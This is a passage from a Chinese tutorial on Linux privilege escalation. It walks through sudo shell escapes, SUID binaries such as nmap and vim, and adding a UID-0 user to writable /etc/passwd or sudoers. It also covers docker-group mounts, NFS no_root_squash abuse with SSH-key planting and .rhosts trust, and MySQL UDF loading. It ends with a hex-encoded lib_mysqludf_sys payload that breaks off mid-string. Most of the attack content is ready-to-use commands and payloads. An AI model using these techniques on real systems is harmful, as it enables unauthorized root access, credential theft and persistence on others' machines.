和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p><p>它的特性主要有这样几点：</p><ul><li>sudo能够限制用户只在某台主机上运行某些命令。</li><li>sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。</li><li>sudo使用时间戳文件来执行类似的“检票”系统。当用户调用sudo并且输入它的密码时，用户获得了一张存活期为5分钟的票（这个值可以在编译的时候改变）。</li><li>sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在&#x2F;etc&#x2F;sudoers，属性必须为0440。</li></ul><p>在sudo于1980年前后被写出之前，一般用户管理系统的方式是利用su切换为超级用户。但是使用su的缺点之一在于必须要先告知超级用户的密码。</p><p>sudo使一般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息，登记在特殊的文件中（通常是&#x2F;etc&#x2F;sudoers），即完成对该用户的授权（此时该用户称为“sudoer”）；在一般用户需要取得特殊权限时，其可在命令前加上“sudo”，此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为5分钟，可在&#x2F;etc&#x2F;sudoers自定义），使用sudo不需要再次输入密码。</p><p>由于不需要超级用户的密码，部分Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例如Ubuntu、Mac OS X等。</p><p>参数说明：</p><ul><li><p>-V 显示版本编号</p></li><li><p>-h 会显示版本编号及指令的使用方式说明</p></li><li><p>-l 显示出自己（执行 sudo 的使用者）的权限</p></li><li><p>-v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码</p></li><li><p>-k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）</p></li><li><p>-b 将要执行的指令放在背景执行</p></li><li><p>-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称</p></li><li><p>-u username&#x2F;#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）</p></li><li><p>-s 执行环境变数中的 SHELL 所指定的 shell ，或是 &#x2F;etc&#x2F;passwd 里所指定的 shell</p></li><li><p>-H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）</p></li><li><p>command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令</p></li></ul><h4 id="2-sudoer文件"><a href="#2-sudoer文件" class="headerlink" title="2.sudoer文件"></a>2.sudoer文件</h4><p><strong>sudoers文件主要有三部分组成：</strong></p><ul><li>sudoers的默认配置（default），主要设置sudo的一些缺省值</li><li>alias（别名），主要有Host_Alias|Runas_Alias|User_Alias|Cmnd_Alias。</li><li>安全策略（规则定义）——<strong>重点</strong>。</li></ul><p><strong>语法</strong></p><p>root ALL&#x3D;(ALL) ALL</p><p>说明1：root用户可以从  ALL终端作为  ALL（任意）用户执行，并运行  ALL（任意）命令。</p><p>第一部分是用户，第二部分是用户可以在其中使用sudo命令的终端，第三部分是他可以充当的用户，最后一部分是他在使用时可以运行的命令。sudo</p><p>touhid ALL&#x3D; &#x2F;sbin&#x2F;poweroff</p><p>说明2：以上命令，使用户可以从任何终端使用touhid的用户密码关闭命令电源。</p><p>touhid ALL &#x3D; (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;find</p><p>说明3：上面的命令，使用户可以从任何终端运行，以root用户身份运行命令find 而无需密码。</p><h3 id="2-利用sudo来提权"><a href="#2-利用sudo来提权" class="headerlink" title="2.利用sudo来提权"></a>2.利用sudo来提权</h3><h4 id="1-利用服务或者命令来提权"><a href="#1-利用服务或者命令来提权" class="headerlink" title="1.利用服务或者命令来提权"></a>1.利用服务或者命令来提权</h4><p><code>sudo -l</code>：显示当前用户所支持的命令、服务，变相的查询当前的权限</p><p><strong>一般滥用sudo命令进行提权的有</strong>：&#x2F;usr&#x2F;bin&#x2F;find、nano、vim、man、awk、less、more、namp、wget</p><p>可以参考<a href="http://evilanne.github.io/2019/07/24/sudo%E6%8F%90%E6%9D%83/">http://evilanne.github.io/2019/07/24/sudo%E6%8F%90%E6%9D%83/</a>     <a href="https://cloud.tencent.com/developer/article/1708368">https://cloud.tencent.com/developer/article/1708368</a></p><p><strong>一般滥用sudo服务进行提权的有</strong>：msql、apache2</p><p><strong>mysql</strong>：<code>sudo mysql -e &#39;\! /bin/sh&#39;</code></p><p><strong>apache2</strong>：</p><p>使用它我们可以查看系统文件。</p><p><code>sudo apache2 -f / etc / shadow</code></p><p>输出是这样的：</p><p><code>Syntax error on line 1 of /etc/shadow:Invalid command &#39;root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::&#39;, perhaps misspelled or defined by a module not included in the server configuration</code></p><p>没有shell，但是我们可以现在提取root哈希，然后再破解哈希。</p><h4 id="2-模拟虚拟终端提权"><a href="#2-模拟虚拟终端提权" class="headerlink" title="2.模拟虚拟终端提权"></a>2.模拟虚拟终端提权</h4><p>有了（疑似）root密码怎么办？可ssh登陆。然而ssh很可能禁止root登陆，或是防火墙规则将你排除在外了。可利用低权shell，找个办法在上面“输入”密码就好了。显然，直接在低权shell里面用sudo是不奏效的。这是因为出于安全考虑，linux要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）。换句话说，sudo在你输入密码的时候本质上是读取了键盘，而不是bash里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。</p><p>python可，在shell里面输入：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo su</span></span><br><span class="line">sudo su</span><br><span class="line">[sudo] password for www-data: 123456</span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for www-data: </span><br></pre></td></tr></table></figure><h4 id="3-漏洞提权-CVE-2019-14287"><a href="#3-漏洞提权-CVE-2019-14287" class="headerlink" title="3.漏洞提权-CVE-2019-14287"></a>3.漏洞提权-CVE-2019-14287</h4><p>关于此漏洞，有一丢丢鸡肋，因为要修改&#x2F;etc&#x2F;sudoers，但是不一定有权限修改此文件。。。可以做一个预留后门，后期使普通账户拥有最高权限。<a href="https://www.cnblogs.com/sstfy/p/11695967.html">https://www.cnblogs.com/sstfy/p/11695967.html</a></p><h2 id="6-suid提权"><a href="#6-suid提权" class="headerlink" title="6.suid提权"></a>6.suid提权</h2><p>suid，代表执行时设置的用户id,为文件附上这样的权限命令：chmod u+s 或者 chmod 4755</p><p>查看正在系统上运行的所有SUID可执行文件的三条命令（这个命令将从&#x2F;目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到&#x2F;dev&#x2F;null，从而仅列出该用户具有访问权限的那些二进制文件。）：</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>      or</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>or</p><p><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</code></p><p>但并不是具有suid权限的文件均可以用来提权，常见的可以用suid提权:</p><p>1.nmap：version(2.02–5.21)带有交互模式，允许用户执行shell命令， 可使用交互式控制台来运行具有相同权限的shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -v(查看版本)</span><br><span class="line">nmap -interactive(启动交互模式)</span><br><span class="line">nmap&gt;!sh(此命令将会得到一个提权后的shell)</span><br></pre></td></tr></table></figure><p>vim：<code>vim -c &#39;!sh&#39;</code></p><p>另外还有find、bash、more、less、nano、cp等，具体参考：<a href="https://www.freebuf.com/articles/system/149118.html">https://www.freebuf.com/articles/system/149118.html</a></p><p>GTFOBins：一个开源项目，记录了Linux下常见的可用来提权的列表以及如何使用：<a href="https://gtfobins.github.io/%EF%BC%8C%E5%85%B7%E4%BD%93%E4%BD%BF%E7%94%A8%E5%8F%AF%E4%BB%A5%E5%8F%82%E8%80%83%EF%BC%9Ahttps://blog.csdn.net/weixin_44214107/article/details/103537647">https://gtfobins.github.io/，具体使用可以参考：https://blog.csdn.net/weixin_44214107/article/details/103537647</a></p><h2 id="7-利用可写文件提权"><a href="#7-利用可写文件提权" class="headerlink" title="7.利用可写文件提权"></a>7.利用可写文件提权</h2><p>大多数linux系统的密码都和&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。</p><p>有关&#x2F;etc&#x2F;passwd 文件里面数据的每个属性，可以参考：<a href="https://blog.csdn.net/qq_36119192/article/details/82228791#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF">https://blog.csdn.net/qq_36119192/article/details/82228791#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF</a></p><h3 id="1-读取-替换hash"><a href="#1-读取-替换hash" class="headerlink" title="1.读取&#x2F;替换hash"></a>1.读取&#x2F;替换hash</h3><p>典型的etc&#x2F;passwd文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br></pre></td></tr></table></figure><p>passwd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面了（这样非root就看不到了）。而shadow里面最重要的就是密码的hash</p><p>典型etc&#x2F;shadow文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$URgq7sJf$4x8e9ntqTwAPIubi9YLxLQ2mZTTZKnGz0g/wWzOdPB5eGuz.S5iRtFdvfFd9VIVEWouiodB/hh9BYOLgAD8u5/:16902:0:99999:7:::</span><br><span class="line">daemon:*:15730:0:99999:7:::</span><br></pre></td></tr></table></figure><p>如果passwd可写，我们就可以把root的密码字段(x)替换成一个已知密码的hash（比如本机shadow里面的root密码hash），这样系统在验证密码时以passwd的为准，密码就已知了。如果shadow可读，我们可以读走root的hash，然后用hashcat或者john暴力破解。</p><h3 id="2-写入新用户"><a href="#2-写入新用户" class="headerlink" title="2.写入新用户"></a>2.写入新用户</h3><p>管理员设置不规范，导致一些文件可写</p><p><code>/etc/passwd</code>可读写，例如写入一个新用户：<code>echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd</code>,账户：test，密码：password@123</p><p><code>/etc/sudoers</code>可写,例如写一个新用户可用sudo执行任何命令：<code>echo &quot;用户名 ALL=(ALL:ALL)ALL&quot;&gt;&gt;/etc/sudoers</code></p><h2 id="8-敏感组提权（docker）"><a href="#8-敏感组提权（docker）" class="headerlink" title="8.敏感组提权（docker）"></a>8.敏感组提权（docker）</h2><p>docker安装之后会有一个docker组，以root权限运行，若权限设置不是很规范，可以利用其搭建一个shell，但是现在docker安装默认权限很低，用处不大~</p><p>下面分享一种docker提权方法，看看就行了别当真，前提是已经拥有docker权限的用户unknower(没有就无解~)</p><p>远程ssh登录：<code>ssh unknower@target-ip</code></p><p>运行以下命令，将目标机的目录(任何你想要的目录)加载到docker镜像来：<code>docker run -v 你想要的目录:/mnt -it alpine </code></p><p>​解释：此命令会到Docker Hub仓库的alpine镜像拉取回来，接着将其运行起来。-v：新建一个磁盘卷给这个docker实例(将目标机你想要的目录映射到docker的&#x2F;mnt目录)。-it：命令运行后进入交互式界面，而不是让这个实例在后台运行。</p><p>咱可以将&#x2F;etc&#x2F;passwd 、etc&#x2F;shadow或者&#x2F;root&#x2F;authorized_keys映射金&#x2F;mnt中，将&#x2F;etc&#x2F;passwd中的hash搞出来解个密，但希望不大，准备白干哈哈，还不如自己写一个root用户进去：</p><p>openssl指定salt使用MD5加密生成一个密码：<code>openssl passwd -1 -salt test</code></p><p>将其写入到passwd中：<code>echo &#39;test:生成的密码:0:0::/root:/bin/bash&#39; &gt;&gt;passwd</code></p><p>再使用ssh就可以登录目标机了~</p><p>然并卵~</p><h2 id="9-劫持环境变量提权"><a href="#9-劫持环境变量提权" class="headerlink" title="9.劫持环境变量提权"></a>9.劫持环境变量提权</h2><p><a href="https://www.webshell.cc/5211.html">https://www.webshell.cc/5211.html</a></p><h2 id="10-网络与隐藏的服务提权"><a href="#10-网络与隐藏的服务提权" class="headerlink" title="10.网络与隐藏的服务提权"></a>10.网络与隐藏的服务提权</h2><p>有一些服务器的服务会被配置成对内网或者对本机开放。通过对他们的攻击我们有机会接触更多的敏感文件，或是运气足够好碰上一个远程root漏洞。</p><p><code>netstat -antup</code>可查看各种网络服务</p><p>如若找到一些特别的服务，可以nc等做一个端口转发用来提权。</p><h2 id="11-通配符注入"><a href="#11-通配符注入" class="headerlink" title="11.通配符注入"></a>11.通配符注入</h2><p><a href="https://www.freebuf.com/articles/system/176255.html">https://www.freebuf.com/articles/system/176255.html</a></p><h2 id="12-NFS弱权限提权"><a href="#12-NFS弱权限提权" class="headerlink" title="12.NFS弱权限提权"></a>12.NFS弱权限提权</h2><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP&#x2F;IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p><h3 id="1-查看目标是否开启nfs服务"><a href="#1-查看目标是否开启nfs服务" class="headerlink" title="1.查看目标是否开启nfs服务"></a>1.查看目标是否开启nfs服务</h3><p>NFS服务的默认开放端口为2049&#x2F;TCP，可以借助Nmap探测目标主机是否开启nfs服务：<code>nmap -p2049 target-ip</code></p><p>也可以通过rpcinfo命令来确定主机上是否运行或挂载了NFS服务：<code>rpcinfo -p target-ip</code></p><h3 id="2-列出目标的导出文件夹列表"><a href="#2-列出目标的导出文件夹列表" class="headerlink" title="2.列出目标的导出文件夹列表"></a>2.列出目标的导出文件夹列表</h3><p><strong>showmount</strong></p><p>显示出导出文件夹列表：<code>showmount -e target-ip</code></p><p>显示指定NFS服务器连接NFS客户端的信息：<code>showmount target-ip </code></p><p>显示被挂挂载的共享目录：<code>showmount -d target-ip </code></p><p>显示挂载点信息和共享目录：<code>showmount -a target-ip </code></p><p><strong>msf</strong></p><p>msf也有相应的模块也可列出导出文件夹：<code>auxiliary/scanner/nfs/nfsmount</code></p><p><strong>nfsshell</strong></p><p>小工具：<a href="https://github.com/NetDirect/nfsshell">https://github.com/NetDirect/nfsshell</a> 可以连接到NFS共享并可以帮助我们手动识别一些常见的安全问题</p><p>安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libreadline-dev libncurses5-dev</span><br><span class="line">make</span><br><span class="line">gcc -g -o nfsshell mount_clnt.o mount_xdr.o nfs_prot_clnt.o nfs_prot_xdr.o nfsshell.o -L/usr/local/lib -lreadline -lhistory -lncurses</span><br><span class="line">./nfsshell</span><br></pre></td></tr></table></figure><p>获取导出文件夹列表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">nfs&gt; </span><span class="language-bash">host target-ip // 连接NFS服务</span></span><br><span class="line"><span class="meta prompt_">nfs&gt; </span><span class="language-bash"><span class="built_in">export</span> // 导出NFS列表</span></span><br></pre></td></tr></table></figure><h3 id="3-访问nfs共享文件夹"><a href="#3-访问nfs共享文件夹" class="headerlink" title="3.访问nfs共享文件夹"></a>3.访问nfs共享文件夹</h3><p>导出的文件夹可以通过创建一个空的本地文件夹，并将共享挂载到该文件夹来访问，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:mkdir /temp/</span><br><span class="line">root@kali:mount -t nfs target-ip:/ /temp -o nolock</span><br></pre></td></tr></table></figure><p>当成功验证共享挂载后，列出本地的所有磁盘信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:df -h</span><br></pre></td></tr></table></figure><p>此时，我们可以像访问其他文件夹一样访问共享文件夹。很多企业和组织不止一次的使用不正确的权限配置将everyone’s 的home目录备份到NFS的共享目录下。或许可以发现宝~</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali：cd /temp</span><br><span class="line">root@kali:/temp# ls</span><br><span class="line">...此地就不列出具体信息</span><br></pre></td></tr></table></figure><h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/temp# ls</span><br><span class="line">password.txt</span><br><span class="line">root@kali:/temp# cat password.txt</span><br><span class="line">cat:password.txt:Permission denied</span><br><span class="line">root@kali:/temp# </span><br></pre></td></tr></table></figure><p>对上述文件没有读取权限？可伪造文件所有者的UID欺骗nfs服务器</p><p>查看文件所有者的名字和文件所有者的UID（用户ID）和GUID（组ID）:<code>ls -al</code>    <code>id</code></p><p>then 在本地创建一个新用户，并将该用户的UID和名称修改为文件所有者相同的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:useradd &lt;name&gt;  #创建一个用户</span><br><span class="line">root@kali:passwd &lt;name&gt;  #为该用户设置密码</span><br></pre></td></tr></table></figure><p>UID可以在passwd文件中更改：<code>vi /etc/passwd</code></p><p>从挂载的文件夹执行su命令，并使用之前创建的已知密码，此时当前用户将会被切换到新用户。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/temp# su &lt;name&gt;</span><br><span class="line">Password:</span><br></pre></td></tr></table></figure><p>由于该文件的UID与新用户的UID相同，因此系统会误认为这是文件权限的所有者，这样我们就可以以一个合法的用户身份来读取文件的内容了。</p><p>之所以造成这种问题，原因在于导出文件夹并未设置root_squash选项。root_squash登入NFS主机，使用该共享目录时相当于该目录的拥有者。但是如果是以root身份使用这个共享目录的时候，那么这个使用者（root）的权限将被压缩成为匿名使用者，即通常他的UID与GID都会变成nobody（root_sqaush参数阻止对连接到NFS卷的远程root用户具有root访问权限，远程根用户在连接时会分配一个用户“ nfsnobody ”，它具有最少的本地特权。如果 no_<em>root_squash</em> 选项开启的话”，并为远程用户授予root用户对所连接系统的访问权限。在配置NFS驱动器时，系统管理员应始终使用“ <em>root_squash</em> ”参数。）那个身份，以防止越权访问。</p><p>可以在以下位置启用或禁用root_squash选项：<code>vi /etc/exports</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home 192.168.1.47(root_squash) // Enables Root Squash</span><br><span class="line">/home 192.168.1.47(no_root_squash) // Disables Root Squash</span><br></pre></td></tr></table></figure><p>如果&#x2F;etc&#x2F;passwd文件在里面且具有写入权限，那么我们可以通过将一些非特权用户的UID更改为0，使其具有根级别的访问权限。从下图中可以看到，我将service用户的UID修改为了0，此时该用户将具备root的访问权限。</p><p>通过SSH连接命令再次与目标服务器建立连接，service将获取到一个root访问权限。<code>ssh service@target-ip</code></p><h3 id="5-进一步提权"><a href="#5-进一步提权" class="headerlink" title="5.进一步提权"></a>5.进一步提权</h3><p>根据存储在导出文件夹中的文件，可能可以通过SSH或RSH和Rlogin来获取到shell访问权限。 我们着重来关注以下两个文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">authorized_keys</span><br><span class="line">rhosts</span><br></pre></td></tr></table></figure><p>这两个文件都隐藏在NFS文件夹中，我们可以利用以下命令来确定这些文件的存在:<code>ls -al</code></p><p>生成一个SSH密钥对并将其公钥添加到授权密钥列表中，那样我们就可以通过NFS服务器上的SSH与其建立连接了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:cd /root/.ssh/</span><br><span class="line">ssh-keygen -t rsa -b 4096cp /root/.ssh/id_rsa.pub /temp/root/.ssh/</span><br><span class="line">cat id_rsa.pub &gt;&gt; /temp/root/.ssh/authorized_keys</span><br><span class="line">ssh -i /root/.ssh/id_rsa root@target-ip</span><br></pre></td></tr></table></figure><p>.rhosts文件用来配置哪些远程主机或用户可以访问系统上的本地帐户。如果.rhosts文件的内容为++符号，则说明它允许来自网络上的任何主机和用户的连接。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat .rhosts</span><br><span class="line">++</span><br></pre></td></tr></table></figure><p>以下命令将允许系统的root用户直接连接目标系统，系统将不会提示密码输入，因为来自系统的所有用户都将被信任。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsh -l root target-ip</span><br><span class="line">rlogin -l root target-ip</span><br></pre></td></tr></table></figure><p>或者如果.rhosts的内容不同，则检查文件将有助于确定哪些主机和用户是可信的，因此可以在无需密码的情况下进行身份验证。</p><p>另外一个小工具可以省不少事：<a href="https://github.com/bonsaiviking/NfSpy">https://github.com/bonsaiviking/NfSpy</a></p><h2 id="13-’-’路径配置错误"><a href="#13-’-’路径配置错误" class="headerlink" title="13.’.’路径配置错误"></a>13.’.’路径配置错误</h2><p>这个俺没搞懂，迷迷糊糊的，自己看吧：<a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651102317&idx=1&sn=0b0a840bd30896eb28b02ac117700bad&chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&scene=132#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect</a></p><h2 id="14-MYSQL数据库提权"><a href="#14-MYSQL数据库提权" class="headerlink" title="14.MYSQL数据库提权"></a>14.MYSQL数据库提权</h2><h3 id="1-UDF提权"><a href="#1-UDF提权" class="headerlink" title="1.UDF提权"></a>1.UDF提权</h3><p>不需要判断mysql是什么版本的，直接查看路径就行，直接写so文件，linux里面的文件是so文件，Windows文件是dll文件。</p><p>我们getshell之后进入终端输入whoami，发现我们只是apache用户权限，我们找一下网站数据库的配置文件，运气好的话查看数据库的账号密码，可以看到账号密码（运气不好就say goodbye，或者进phpmyadmin瞅瞅，或者找到mysql&#x2F;data&#x2F;mysql&#x2F;user.MYD，用enjoy c32asm将其密码账号hex出来）</p><p>登陆mysql数据库，可以在MySQL里输入<code>show variables like ‘%plugin%’; </code>直接查看plugin路径</p><p>然后我们把so文件利用16进制编辑工具进行编码，再解码写入plugin目录中,返回为true，写入成功。</p><p>关于so文件来源：<a href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a>  </p><p>下载后解压编译：<code>gcc -DMYSQL_DYNAMIC_PLUGIN -fPIC -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so</code></p><p>编译时可能会报错：<code>error:my_compiler.h:No such file or directory</code>,这是一个mysql的bug引起的错误，只要修改&#x2F;usr&#x2F;include&#x2F;mysql&#x2F;my_global.h文件，注释掉626行重新编译就可以了。生成文件lib_mysqludf_sys.so后，使用Hex.hta获取16进制,我已经将转为16进制的so文件放下面了，自取。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFF